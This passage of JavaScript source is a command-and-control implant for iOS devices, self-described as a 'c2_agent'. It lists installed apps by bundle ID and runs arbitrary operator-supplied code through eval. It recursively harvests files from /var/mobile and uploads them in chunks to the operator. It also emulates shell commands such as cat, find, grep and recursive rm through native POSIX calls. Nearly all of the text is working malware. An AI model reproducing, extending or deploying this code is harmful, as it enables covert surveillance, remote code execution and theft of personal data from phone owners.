(dirs[i].type !== \"dir\") continue;\n\t\tconst meta = base + \"/\" + dirs[i].name + \"/.com.apple.mobile_container_manager.metadata.plist\";\n\t\tconst ok = Number(Native.callSymbol(\"access\", meta, 0)) === 0;\n\t\tvar bundleId = \"\";\n\t\tif (ok) {\n\t\t\tvar bytes = _readFileBytes(meta, 8192);\n\t\t\tif (bytes && bytes.length > 0) bundleId = _extractBundleId(bytes);\n\t\t}\n\t\tapps.push({ uuid: dirs[i].name, bundleId: bundleId, hasMetadata: ok });\n\t}\n\tsendJSON(cmd.command_id, apps, \"app_list.json\");\n}\n\nfunction handleExec(cmd) {\n\tvar p = cmd.params || {};\n\tvar code = p.code;\n\tvar startMs = Date.now();\n\tif (!code) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\", error: \"empty code\",\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"exec_result.json\");\n\t\treturn;\n\t}\n\ttry {\n\t\tvar r = eval(code);\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"success\",\n\t\t\tresult: String(r !== undefined ? r : \"\"),\n\t\t\texecution_time: (Date.now() - startMs) / 1000,\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"exec_result.json\");\n\t} catch (e) {\n\t\tsendJSON(cmd.command_id, {\n\t\t\tstatus: \"failed\",\n\t\t\terror: String(e),\n\t\t\texecution_time: (Date.now() - startMs) / 1000,\n\t\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t\t}, \"exec_result.json\");\n\t}\n}\n\n// ============================================================================\n// file_upload: scan directories, filter files, upload matching ones in chunks\n// ============================================================================\n\nfunction _scanDir(base, files, recurse, excludes, filterMode, exts, maxSz) {\n\tvar items = listDir(base);\n\tfor (var i = 0; i < items.length; i++) {\n\t\tvar full = base + \"/\" + items[i].name;\n\t\tif (items[i].type === \"dir\") {\n\t\t\tif (!recurse) continue;\n\t\t\tvar skip = false;\n\t\t\tfor (var e = 0; e < excludes.length; e++) {\n\t\t\t\tif (full === excludes[e]) { skip = true; break; }\n\t\t\t}\n\t\t\tif (!skip) _scanDir(full, files, recurse, excludes, filterMode, exts, maxSz);\n\t\t} else if (items[i].type === \"file\") {\n\t\t\tif (maxSz > 0) {\n\t\t\t\tvar fd = Number(Native.callSymbol(\"open\", full, 0, 0));\n\t\t\t\tif (fd >= 0) {\n\t\t\t\t\tvar sz = Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\t\t\t\t\tNative.callSymbol(\"close\", fd);\n\t\t\t\t\tif (sz > maxSz) continue;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (filterMode === \"include\" && exts.length > 0) {\n\t\t\t\tvar dot = items[i].name.lastIndexOf(\".\");\n\t\t\t\tif (dot < 0) continue;\n\t\t\t\tvar ext = items[i].name.substring(dot).toLowerCase();\n\t\t\t\tvar found = false;\n\t\t\t\tfor (var x = 0; x < exts.length; x++) {\n\t\t\t\t\tif (exts[x].toLowerCase() === ext) { found = true; break; }\n\t\t\t\t}\n\t\t\t\tif (!found) continue;\n\t\t\t} else if (filterMode === \"exclude\" && exts.length > 0) {\n\t\t\t\tvar dot2 = items[i].name.lastIndexOf(\".\");\n\t\t\t\tif (dot2 >= 0) {\n\t\t\t\t\tvar ext2 = items[i].name.substring(dot2).toLowerCase();\n\t\t\t\t\tvar blocked = false;\n\t\t\t\t\tfor (var x2 = 0; x2 < exts.length; x2++) {\n\t\t\t\t\t\tif (exts[x2].toLowerCase() === ext2) { blocked = true; break; }\n\t\t\t\t\t}\n\t\t\t\t\tif (blocked) continue;\n\t\t\t\t}\n\t\t\t}\n\t\t\tfiles.push(full);\n\t\t}\n\t}\n}\n\nfunction handleFileUpload(cmd) {\n\tvar p = cmd.params || {};\n\tvar paths = p.upload_paths || [\"/var/mobile\"];\n\tvar filterMode = p.filter_mode || \"none\";\n\tvar extStr = p.file_extensions || \"\";\n\tvar exts = extStr ? extStr.split(\",\") : [];\n\tvar recurse = (p.include_subdirs !== false);\n\tvar excludes = p.exclude_dirs || [];\n\tvar maxMB = p.max_file_size_mb;\n\tvar maxSz = (maxMB && maxMB > 0) ? maxMB * 1024 * 1024 : 0;\n\n\tvar files = [];\n\tfor (var pi = 0; pi < paths.length; pi++) {\n\t\t_scanDir(paths[pi], files, recurse, excludes, filterMode, exts, maxSz);\n\t}\n\n\tvar uploaded = 0;\n\tfor (var fi = 0; fi < files.length; fi++) {\n\t\tvar fname = files[fi].replace(/\\//g, \"_\");\n\t\tif (fname.charAt(0) === \"_\") fname = fname.substring(1);\n\t\tvar sz = getFileSize(files[fi]);\n\t\tif (sz <= 0) continue;\n\t\tif (sz <= CHUNK_SIZE) {\n\t\t\tvar rd = readFileB64(files[fi], maxSz > 0 ? maxSz : MAX_FILE_SIZE);\n\t\t\tif (rd) {\n\t\t\t\tsendResult(cmd.command_id, rd.b64, fname, \"file_upload\");\n\t\t\t\tuploaded++;\n\t\t\t}\n\t\t} else {\n\t\t\tvar chunkRes = sendFileChunked(cmd.command_id, files[fi], fname, \"file_upload\");\n\t\t\tif (chunkRes && chunkRes.ok) uploaded++;\n\t\t}\n\t}\n\tsendJSON(cmd.command_id, {\n\t\tscanned: files.length, uploaded: uploaded,\n\t\t_task_id: p._task_id || \"\", _task_type: p._task_type || \"\"\n\t}, \"file_upload_summary.json\");\n}\n\n// ============================================================================\n// Execute Command - unified shell-like command interface\n// Since c2_agent runs in a JS sandbox without shell access, common shell\n// commands are emulated via POSIX native calls.\n// Result format follows API spec: { exit_code, stdout(b64), stderr(b64),\n//                                    execution_time, timeout }\n// ============================================================================\n\nvar _cwd = \"/var/mobile\";\n\nfunction _parseArgs(cmdStr) {\n\tvar args = [];\n\tvar cur = \"\";\n\tvar inQ = 0;\n\tfor (var i = 0; i < cmdStr.length; i++) {\n\t\tvar c = cmdStr.charAt(i);\n\t\tif (c === '\\\\' && i + 1 < cmdStr.length) { cur += cmdStr.charAt(++i); continue; }\n\t\tif (inQ === 1) { if (c === \"'\") inQ = 0; else cur += c; continue; }\n\t\tif (inQ === 2) { if (c === '\"') inQ = 0; else cur += c; continue; }\n\t\tif (c === \"'\") { inQ = 1; continue; }\n\t\tif (c === '\"') { inQ = 2; continue; }\n\t\tif (c === ' ' || c === '\\t') {\n\t\t\tif (cur.length) { args.push(cur); cur = \"\"; }\n\t\t\tcontinue;\n\t\t}\n\t\tcur += c;\n\t}\n\tif (cur.length) args.push(cur);\n\treturn args;\n}\n\nfunction _resolvePath(p) {\n\tif (!p) return _cwd;\n\tif (p === \"~\") return \"/var/mobile\";\n\tif (p.indexOf(\"~/\") === 0) return \"/var/mobile\" + p.substring(1);\n\tif (p.charAt(0) === '/') return p;\n\tvar base = _cwd;\n\tif (base.charAt(base.length - 1) !== '/') base += '/';\n\tvar parts = (base + p).split('/');\n\tvar res = [];\n\tfor (var i = 0; i < parts.length; i++) {\n\t\tif (parts[i] === '' && i > 0) continue;\n\t\tif (parts[i] === '.') continue;\n\t\tif (parts[i] === '..') { if (res.length > 1) res.pop(); }\n\t\telse res.push(parts[i]);\n\t}\n\treturn res.join('/') || '/';\n}\n\nfunction _strToB64(s) {\n\tif (!s) return \"\";\n\treturn bytesToBase64(new Uint8Array(Native.stringToBytes(s, false)));\n}\n\nfunction _readFileBytes(path, maxSz) {\n\tmaxSz = maxSz || (2 * 1024 * 1024);\n\tvar fd = Number(Native.callSymbol(\"open\", path, 0, 0));\n\tif (fd < 0) return null;\n\ttry {\n\t\tvar sz = Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\t\tNative.callSymbol(\"lseek\", fd, 0, 0);\n\t\tif (sz < 0) return null;\n\t\tif (sz === 0) return new Uint8Array(0);\n\t\tvar toRead = sz > maxSz ? maxSz : sz;\n\t\tvar buf = Native.callSymbol(\"malloc\", BigInt(toRead));\n\t\tif (!buf || buf === 0n) return null;\n\t\ttry {\n\t\t\tvar nr = Number(Native.callSymbol(\"read\", fd, buf, toRead));\n\t\t\tif (nr <= 0) return new Uint8Array(0);\n\t\t\treturn new Uint8Array(Native.read(buf, nr));\n\t\t} finally { Native.callSymbol(\"free\", buf); }\n\t} finally { Native.callSymbol(\"close\", fd); }\n}\n\nfunction _rawToStr(bytes) {\n\tvar s = \"\";\n\tfor (var i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);\n\treturn s;\n}\n\nfunction _statFile(path) {\n\tvar sb = Native.callSymbol(\"calloc\", 1, 144);\n\tif (!sb || sb === 0n) return null;\n\tvar r = Number(Native.callSymbol(\"lstat\", path, BigInt(sb)));\n\tif (r !== 0) { Native.callSymbol(\"free\", sb); return null; }\n\tvar mode  = _readU16(BigInt(sb), 4);\n\tvar nlink = _readU16(BigInt(sb), 6);\n\tvar size  = _readI64(BigInt(sb), 96);\n\tvar atime = _readI64(BigInt(sb), 32);\n\tvar mtime = _readI64(BigInt(sb), 48);\n\tvar ctime = _readI64(BigInt(sb), 80);\n\tNative.callSymbol(\"free\", sb);\n\tvar fmt = mode & 0xF000;\n\treturn {\n\t\tmode: mode, nlink: nlink, size: size,\n\t\tatime: atime, mtime: mtime, ctime: ctime,\n\t\tisDir: fmt === 0x4000, isFile: fmt === 0x8000, isLink: fmt === 0xA000,\n\t\ttype: fmt === 0x4000 ? \"dir\" : fmt === 0xA000 ? \"link\" : \"file\"\n\t};\n}\n\nfunction _modeStr(mode) {\n\tvar fmt = mode & 0xF000;\n\tvar t = fmt === 0x4000 ? 'd' : fmt === 0xA000 ? 'l' : '-';\n\tvar bits = [0x100,0x080,0x040,0x020,0x010,0x008,0x004,0x002,0x001];\n\tvar chars = \"rwxrwxrwx\";\n\tvar p = \"\";\n\tfor (var i = 0; i < 9; i++) p += (mode & bits[i]) ? chars.charAt(i) : '-';\n\treturn t + p;\n}\n\nfunction _fmtSizeH(n) {\n\tif (n < 1024) return n + \"\";\n\tif (n < 1048576) return (n / 1024).toFixed(1) + \"K\";\n\tif (n < 1073741824) return (n / 1048576).toFixed(1) + \"M\";\n\treturn (n / 1073741824).toFixed(1) + \"G\";\n}\n\n// ---- File System Commands ----\n\nfunction _cmdLs(args) {\n\tvar long = false, all = false, target = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tvar a = args[i];\n\t\tif (a.charAt(0) === '-') {\n\t\t\tfor (var j = 1; j < a.length; j++) {\n\t\t\t\tif (a.charAt(j) === 'l') long = true;\n\t\t\t\tif (a.charAt(j) === 'a') all = true;\n\t\t\t}\n\t\t} else target = a;\n\t}\n\tvar path = _resolvePath(target);\n\tvar st = _statFile(path);\n\tif (!st) return { code: 2, out: \"\", err: \"ls: \" + path + \": No such file or directory\\n\" };\n\tif (st.isFile) {\n\t\tif (long) return { code: 0, out: _modeStr(st.mode) + \"\\t\" + st.size + \"\\t\" + path + \"\\n\", err: \"\" };\n\t\treturn { code: 0, out: path + \"\\n\", err: \"\" };\n\t}\n\tvar items = listDir(path);\n\tvar out = \"\";\n\tfor (var i = 0; i < items.length; i++) {\n\t\tif (!all && items[i].name.charAt(0) === '.') continue;\n\t\tif (long) {\n\t\t\tvar fp = path + (path === \"/\" ? \"\" : \"/\") + items[i].name;\n\t\t\tvar fs = _statFile(fp);\n\t\t\tif (fs) {\n\t\t\t\tout += _modeStr(fs.mode) + \"\\t\" + fs.size + \"\\t\" + items[i].name + \"\\n\";\n\t\t\t} else {\n\t\t\t\tout += (items[i].type === \"dir\" ? \"d\" : \"-\") + \"---------\\t0\\t\" + items[i].name + \"\\n\";\n\t\t\t}\n\t\t} else {\n\t\t\tout += items[i].name + \"\\n\";\n\t\t}\n\t}\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdCat(args) {\n\tif (args.length < 2) return { code: 1, out: \"\", err: \"cat: missing operand\\n\" };\n\tvar out = \"\", errs = \"\", fail = false;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tvar path = _resolvePath(args[i]);\n\t\tvar acc = Number(Native.callSymbol(\"access\", path, 0));\n\t\tif (acc !== 0) { errs += \"cat: \" + path + \": No such file or directory\\n\"; fail = true; continue; }\n\t\tvar sz = getFileSize(path);\n\t\tif (sz > 2 * 1024 * 1024) { errs += \"cat: \" + path + \": File too large (max 2MB)\\n\"; fail = true; continue; }\n\t\tif (sz === 0) continue;\n\t\tvar bytes = _readFileBytes(path);\n\t\tif (!bytes || bytes.length === 0) continue;\n\t\tout += _rawToStr(bytes);\n\t}\n\treturn { code: fail ? 1 : 0, out: out, err: errs };\n}\n\nfunction _cmdPwd() { return { code: 0, out: _cwd + \"\\n\", err: \"\" }; }\n\nfunction _cmdCd(args) {\n\tvar target = args.length > 1 ? args[1] : \"/var/mobile\";\n\tvar path = _resolvePath(target);\n\tvar st = _statFile(path);\n\tif (!st) return { code: 1, out: \"\", err: \"cd: \" + path + \": No such file or directory\\n\" };\n\tif (!st.isDir) return { code: 1, out: \"\", err: \"cd: \" + path + \": Not a directory\\n\" };\n\t_cwd = path;\n\treturn { code: 0, out: \"\", err: \"\" };\n}\n\nfunction _cmdMkdir(args) {\n\tvar mkp = false, target = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-p\") mkp = true;\n\t\telse target = args[i];\n\t}\n\tif (!target) return { code: 1, out: \"\", err: \"mkdir: missing operand\\n\" };\n\tvar path = _resolvePath(target);\n\tif (mkp) {\n\t\tvar parts = path.split('/');\n\t\tvar cur = \"\";\n\t\tfor (var i = 0; i < parts.length; i++) {\n\t\t\tcur += (i === 0 ? \"\" : \"/\") + parts[i];\n\t\t\tif (!cur) cur = \"/\";\n\t\t\tif (!_statFile(cur)) Native.callSymbol(\"mkdir\", cur, 0x1ed);\n\t\t}\n\t} else {\n\t\tvar r = Number(Native.callSymbol(\"mkdir\", path, 0x1ed));\n\t\tif (r !== 0) return { code: 1, out: \"\", err: \"mkdir: \" + path + \": Cannot create directory\\n\" };\n\t}\n\treturn { code: 0, out: \"\", err: \"\" };\n}\n\nfunction _rmRecursive(path) {\n\tvar items = listDir(path);\n\tfor (var i = 0; i < items.length; i++) {\n\t\tvar fp = path + \"/\" + items[i].name;\n\t\tif (items[i].type === \"dir\") _rmRecursive(fp);\n\t\telse Native.callSymbol(\"unlink\", fp);\n\t}\n\tNative.callSymbol(\"rmdir\", path);\n}\n\nfunction _cmdRm(args) {\n\tvar recursive = false, force = false, targets = [];\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i].charAt(0) === '-') {\n\t\t\tfor (var j = 1; j < args[i].length; j++) {\n\t\t\t\tvar ch = args[i].charAt(j);\n\t\t\t\tif (ch === 'r' || ch === 'R') recursive = true;\n\t\t\t\tif (ch === 'f') force = true;\n\t\t\t}\n\t\t} else targets.push(args[i]);\n\t}\n\tif (!targets.length) return { code: 1, out: \"\", err: \"rm: missing operand\\n\" };\n\tvar errs = \"\";\n\tfor (var t = 0; t < targets.length; t++) {\n\t\tvar path = _resolvePath(targets[t]);\n\t\tvar st = _statFile(path);\n\t\tif (!st) { if (!force) errs += \"rm: \" + path + \": No such file or directory\\n\"; continue; }\n\t\tif (st.isDir) {\n\t\t\tif (!recursive) { errs += \"rm: \" + path + \": Is a directory\\n\"; continue; }\n\t\t\t_rmRecursive(path);\n\t\t} else {\n\t\t\tvar r = Number(Native.callSymbol(\"unlink\", path));\n\t\t\tif (r !== 0 && !force) errs += \"rm: \" + path + \": Permission denied\\n\";\n\t\t}\n\t}\n\treturn { code: errs ? 1 : 0, out: \"\", err: errs };\n}\n\nfunction _cmdCp(args) {\n\tif (args.length < 3) return { code: 1, out: \"\", err: \"cp: missing operand\\n\" };\n\tvar src = _resolvePath(args[1]);\n\tvar dst = _resolvePath(args[2]);\n\tvar srcSt = _statFile(src);\n\tif (!srcSt) return { code: 1, out: \"\", err: \"cp: \" + src + \": No such file or directory\\n\" };\n\tif (!srcSt.isFile) return { code: 1, out: \"\", err: \"cp: \" + src + \": Not a regular file\\n\" };\n\tvar dstSt = _statFile(dst);\n\tif (dstSt && dstSt.isDir) dst = dst + \"/\" + src.split('/').pop();\n\n\tvar srcFd = Number(Native.callSymbol(\"open\", src, 0, 0));\n\tif (srcFd < 0) return { code: 1, out: \"\", err: \"cp: \" + src + \": Permission denied\\n\" };\n\tvar dstFd = Number(Native.callSymbol(\"open\", dst, 0x0601, 0x1a4));\n\tif (dstFd < 0) { Native.callSymbol(\"close\", srcFd); return { code: 1, out: \"\", err: \"cp: \" + dst + \": Cannot create file\\n\" }; }\n\n\tvar BUF = 65536;\n\tvar buf = Native.callSymbol(\"malloc\", BigInt(BUF));\n\tif (!buf || buf === 0n) {\n\t\tNative.callSymbol(\"close\", srcFd); Native.callSymbol(\"close\", dstFd);\n\t\treturn { code: 1, out: \"\", err: \"cp: out of memory\\n\" };\n\t}\n\tvar err = \"\";\n\ttry {\n\t\tfor (;;) {\n\t\t\tvar nr = Number(Native.callSymbol(\"read\", srcFd, buf, BUF));\n\t\t\tif (nr <= 0) break;\n\t\t\tvar nw = Number(Native.callSymbol(\"write\", dstFd, buf, nr));\n\t\t\tif (nw !== nr) { err = \"cp: write error\\n\"; break; }\n\t\t}\n\t} finally {\n\t\tNative.callSymbol(\"free\", buf);\n\t\tNative.callSymbol(\"close\", srcFd);\n\t\tNative.callSymbol(\"close\", dstFd);\n\t}\n\tif (!err) Native.callSymbol(\"chmod\", dst, 0x1A4);\n\treturn { code: err ? 1 : 0, out: \"\", err: err };\n}\n\nfunction _cmdMv(args) {\n\tif (args.length < 3) return { code: 1, out: \"\", err: \"mv: missing operand\\n\" };\n\tvar src = _resolvePath(args[1]);\n\tvar dst = _resolvePath(args[2]);\n\tvar dstSt = _statFile(dst);\n\tif (dstSt && dstSt.isDir) dst = dst + \"/\" + src.split('/').pop();\n\tvar r = Number(Native.callSymbol(\"rename\", src, dst));\n\tif (r !== 0) return { code: 1, out: \"\", err: \"mv: cannot move \" + src + \" to \" + dst + \"\\n\" };\n\treturn { code: 0, out: \"\", err: \"\" };\n}\n\nfunction _cmdStat(args) {\n\tif (args.length < 2) return { code: 1, out: \"\", err: \"stat: missing operand\\n\" };\n\tvar path = _resolvePath(args[1]);\n\tvar st = _statFile(path);\n\tif (!st) return { code: 1, out: \"\", err: \"stat: \" + path + \": No such file or directory\\n\" };\n\tvar out = \"  File: \" + path + \"\\n\";\n\tout += \"  Size: \" + st.size + \"\\tType: \" + st.type + \"\\n\";\n\tout += \"  Mode: \" + _modeStr(st.mode) + \" (\" + (st.mode & 0xFFF).toString(8) + \")\\n\";\n\tout += \" Links: \" + st.nlink + \"\\n\";\n\tout += \"Access: \" + new Date(st.atime * 1000).toISOString() + \"\\n\";\n\tout += \"Modify: \" + new Date(st.mtime * 1000).toISOString() + \"\\n\";\n\tout += \"Change: \" + new Date(st.ctime * 1000).toISOString() + \"\\n\";\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdChmod(args) {\n\tif (args.length < 3) return { code: 1, out: \"\", err: \"chmod: missing operand\\n\" };\n\tvar mode = parseInt(args[1], 8);\n\tif (isNaN(mode)) return { code: 1, out: \"\", err: \"chmod: invalid mode: \" + args[1] + \"\\n\" };\n\tvar path = _resolvePath(args[2]);\n\tvar r = Number(Native.callSymbol(\"chmod\", path, mode));\n\tif (r !== 0) return { code: 1, out: \"\", err: \"chmod: \" + path + \": Operation not permitted\\n\" };\n\treturn { code: 0, out: \"\", err: \"\" };\n}\n\nfunction _cmdTouch(args) {\n\tif (args.length < 2) return { code: 1, out: \"\", err: \"touch: missing operand\\n\" };\n\tvar path = _resolvePath(args[1]);\n\tvar st = _statFile(path);\n\tif (st) {\n\t\tNative.callSymbol(\"utimes\", path, 0n);\n\t} else {\n\t\tvar fd = Number(Native.callSymbol(\"open\", path, 0x0601, 0x1a4));\n\t\tif (fd < 0) return { code: 1, out: \"\", err: \"touch: \" + path + \": Cannot create file\\n\" };\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n\treturn { code: 0, out: \"\", err: \"\" };\n}\n\nfunction _cmdLn(args) {\n\tvar sym = false, target = null, link = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-s\") sym = true;\n\t\telse if (!target) target = args[i];\n\t\telse link = args[i];\n\t}\n\tif (!target || !link) return { code: 1, out: \"\", err: \"ln: usage: ln [-s] target link\\n\" };\n\tvar tgt = _resolvePath(target);\n\tvar lnk = _resolvePath(link);\n\tvar fn = sym ? \"symlink\" : \"link\";\n\tvar r = Number(Native.callSymbol(fn, tgt, lnk));\n\tif (r !== 0) return { code: 1, out: \"\", err: \"ln: \" + lnk + \": Operation failed\\n\" };\n\treturn { code: 0, out: \"\", err: \"\" };\n}\n\nfunction _cmdReadlink(args) {\n\tif (args.length < 2) return { code: 1, out: \"\", err: \"readlink: missing operand\\n\" };\n\tvar path = _resolvePath(args[1]);\n\tvar buf = Native.callSymbol(\"malloc\", 1024);\n\tif (!buf || buf === 0n) return { code: 1, out: \"\", err: \"readlink: failed\\n\" };\n\ttry {\n\t\tvar len = Number(Native.callSymbol(\"readlink\", path, buf, 1023));\n\t\tif (len <= 0) return { code: 1, out: \"\", err: \"readlink: \" + path + \": Invalid argument\\n\" };\n\t\treturn { code: 0, out: Native.readString(buf, len) + \"\\n\", err: \"\" };\n\t} finally { Native.callSymbol(\"free\", buf); }\n}\n\nfunction _matchGlob(name, pattern) {\n\tif (!pattern) return true;\n\tif (pattern === \"*\") return true;\n\tif (pattern.indexOf('*') < 0 && pattern.indexOf('?') < 0) return name === pattern;\n\tvar re = \"^\";\n\tfor (var i = 0; i < pattern.length; i++) {\n\t\tvar c = pattern.charAt(i);\n\t\tif (c === '*') re += \".*\";\n\t\telse if (c === '?') re += \".\";\n\t\telse if (\".+^${}()|[]\\\\\".indexOf(c) >= 0) re += \"\\\\\" + c;\n\t\telse re += c;\n\t}\n\tre += \"$\";\n\ttry { return new RegExp(re).test(name); }\n\tcatch(e) { return name.indexOf(pattern.replace(/\\*/g, '')) >= 0; }\n}\n\nfunction _findRecursive(base, namePattern, typeFilter, results, depth, maxDepth) {\n\tif (depth > maxDepth || results.length > 10000) return;\n\tvar items = listDir(base);\n\tfor (var i = 0; i < items.length; i++) {\n\t\tvar fp = base + (base === \"/\" ? \"\" : \"/\") + items[i].name;\n\t\tvar isDir = items[i].type === \"dir\";\n\t\tvar isFile = items[i].type === \"file\";\n\t\tif (typeFilter === \"f\" && !isFile) {\n\t\t\tif (isDir) _findRecursive(fp, namePattern, typeFilter, results, depth + 1, maxDepth);\n\t\t\tcontinue;\n\t\t}\n\t\tif (typeFilter === \"d\" && !isDir) continue;\n\t\tif (_matchGlob(items[i].name, namePattern)) results.push(fp);\n\t\tif (isDir) _findRecursive(fp, namePattern, typeFilter, results, depth + 1, maxDepth);\n\t}\n}\n\nfunction _cmdFind(args) {\n\tvar searchPath = null, namePattern = null, typeFilter = null;\n\tvar i = 1;\n\twhile (i < args.length) {\n\t\tif (args[i] === \"-name\" && i + 1 < args.length) { namePattern = args[i + 1]; i += 2; }\n\t\telse if (args[i] === \"-type\" && i + 1 < args.length) { typeFilter = args[i + 1]; i += 2; }\n\t\telse if (args[i].charAt(0) !== '-') { searchPath = args[i]; i++; }\n\t\telse { i++; }\n\t}\n\tvar path = _resolvePath(searchPath || \".\");\n\tvar results = [];\n\t_findRecursive(path, namePattern, typeFilter, results, 0, 20);\n\treturn { code: 0, out: results.join(\"\\n\") + (results.length ? \"\\n\" : \"\"), err: \"\" };\n}\n\nfunction _cmdHead(args) {\n\tvar n = 10, file = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-n\" && i + 1 < args.length) { n = parseInt(args[++i]); }\n\t\telse if (args[i].charAt(0) !== '-') file = args[i];\n\t}\n\tif (!file) return { code: 1, out: \"\", err: \"head: missing operand\\n\" };\n\tvar path = _resolvePath(file);\n\tvar bytes = _readFileBytes(path);\n\tif (!bytes) return { code: 1, out: \"\", err: \"head: \" + path + \": No such file or directory\\n\" };\n\tvar text = _rawToStr(bytes);\n\tvar lines = text.split('\\n');\n\tvar out = lines.slice(0, n).join('\\n');\n\tif (lines.length > n) out += '\\n';\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdTail(args) {\n\tvar n = 10, file = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-n\" && i + 1 < args.length) { n = parseInt(args[++i]); }\n\t\telse if (args[i].charAt(0) !== '-') file = args[i];\n\t}\n\tif (!file) return { code: 1, out: \"\", err: \"tail: missing operand\\n\" };\n\tvar path = _resolvePath(file);\n\tvar bytes = _readFileBytes(path);\n\tif (!bytes) return { code: 1, out: \"\", err: \"tail: \" + path + \": No such file or directory\\n\" };\n\tvar text = _rawToStr(bytes);\n\tvar lines = text.split('\\n');\n\tvar start = lines.length > n ? lines.length - n : 0;\n\treturn { code: 0, out: lines.slice(start).join('\\n'), err: \"\" };\n}\n\nfunction _cmdWc(args) {\n\tvar cntL = false, cntW = false, cntC = false, file = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i].charAt(0) === '-') {\n\t\t\tfor (var j = 1; j < args[i].length; j++) {\n\t\t\t\tvar ch = args[i].charAt(j);\n\t\t\t\tif (ch === 'l') cntL = true;\n\t\t\t\tif (ch === 'w') cntW = true;\n\t\t\t\tif (ch === 'c') cntC = true;\n\t\t\t}\n\t\t} else file = args[i];\n\t}\n\tif (!file) return { code: 1, out: \"\", err: \"wc: missing operand\\n\" };\n\tif (!cntL && !cntW && !cntC) { cntL = true; cntW = true; cntC = true; }\n\tvar path = _resolvePath(file);\n\tvar bytes = _readFileBytes(path);\n\tif (!bytes) return { code: 1, out: \"\", err: \"wc: \" + path + \": No such file or directory\\n\" };\n\tvar text = _rawToStr(bytes);\n\tvar out = \"\";\n\tif (cntL) { var nl = 0; for (var k = 0; k < text.length; k++) if (text.charAt(k) === '\\n') nl++; out += nl + \"\\t\"; }\n\tif (cntW) {\n\t\tvar wc = 0, inWord = false;\n\t\tfor (var k = 0; k < text.length; k++) {\n\t\t\tvar cc = text.charCodeAt(k);\n\t\t\tvar ws = (cc === 32 || cc === 9 || cc === 10 || cc === 13);\n\t\t\tif (!ws && !inWord) { wc++; inWord = true; }\n\t\t\tif (ws) inWord = false;\n\t\t}\n\t\tout += wc + \"\\t\";\n\t}\n\tif (cntC) out += bytes.length + \"\\t\";\n\tout += path + \"\\n\";\n\treturn { code: 0, out: out, err: \"\" };\n}\n\nfunction _cmdGrep(args) {\n\tif (args.length < 3) return { code: 1, out: \"\", err: \"grep: usage: grep pattern file\\n\" };\n\tvar ignCase = false, lineNum = false;\n\tvar pattern = null, file = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-i\") ignCase = true;\n\t\telse if (args[i] === \"-n\") lineNum = true;\n\t\telse if (!pattern) pattern = args[i];\n\t\telse file = args[i];\n\t}\n\tif (!pattern || !file) return { code: 1, out: \"\", err: \"grep: usage: grep [-in] pattern file\\n\" };\n\tvar path = _resolvePath(file);\n\tvar bytes = _readFileBytes(path);\n\tif (!bytes) return { code: 1, out: \"\", err: \"grep: \" + path + \": No such file or directory\\n\" };\n\tvar text = _rawToStr(bytes);\n\tvar lines = text.split('\\n');\n\tvar out = \"\";\n\tvar found = false;\n\tvar pat = ignCase ? pattern.toLowerCase() : pattern;\n\tfor (var i = 0; i < lines.length; i++) {\n\t\tvar line = ignCase ? lines[i].toLowerCase() : lines[i];\n\t\tif (line.indexOf(pat) >= 0) {\n\t\t\tout += (lineNum ? (i + 1) + \":\" : \"\") + lines[i] + \"\\n\";\n\t\t\tfound = true;\n\t\t}\n\t}\n\treturn { code: found ? 0 : 1, out: out, err: \"\" };\n}\n\nfunction _duRecursive(path, depth) {\n\tif (depth > 50) return 0;\n\tvar st = _statFile(path);\n\tif (!st) return 0;\n\tif (st.isFile) return st.size;\n\tvar total = 0;\n\tvar items = listDir(path);\n\tfor (var i = 0; i < items.length; i++) {\n\t\ttotal += _duRecursive(path + \"/\" + items[i].name, depth + 1);\n\t}\n\treturn total;\n}\n\nfunction _cmdDu(args) {\n\tvar summary = false, human = false, target = null;\n\tfor (var i = 1; i < args.length; i++) {\n\t\tif (args[i] === \"-s\") summary = true;\n\t\telse if (args[i] === \"-h\") human = true;\n\t\telse if (args[i].charAt(0) !== '-') target = args[i];\n\t}\n\tvar path = _resolvePath(target || \".\");\n\tvar total = _duRecursive(path, 0);\n\tvar sizeStr = human ? _fmtSizeH(total) : \"\" + (total / 1024 | 0);\n\treturn { code: 0, out: sizeStr + \"\\t\" + path + \"\\n\", err: \"\" };\n}\n\nfunction _cmdFile(args) {\n\tif (args.length < 2) return { code: 1, out: \"\", err: \"file: missing operand\\n\" };\n\tvar path = _resolvePath(args[1]);\n\tvar st = _statFile(path);\n\tif (!st) return { code: 1, out: \"\", err: \"file: \" + path + \": No such file or directory\\n\" };\n\tif (st.isDir) return { code: 0, out: path + \": directory\\n\", err: \"\" };\n\tif (st.isLink) return { code: 0, out: path + \": symbolic link\\n\", err: \"\" };\n\tvar bytes = _readFileBytes(path, 512);\n\tif (!bytes || bytes.length === 0) return { code: 0, out: path + \": empty\\n\", err: \"\" };\n\tif (bytes.length >= 4) {\n\t\tif (bytes[0]===0xCF && bytes[1]===0xFA && bytes[2]===0xED && bytes[3]===0xFE) return { code: 0, out: path + \": Mach-O 64-bit executable\\n\", err: \"\" };\n\t\tif (bytes[0]===0xCA && bytes[1]===0xFE && bytes[2]===0xBA && bytes[3]===0xBE) return { code: 0, out: path + \": Mach-O universal binary\\n\", err: \"\" };\n\t\tif (bytes[0]===0x89 && bytes[1]===0x50 && 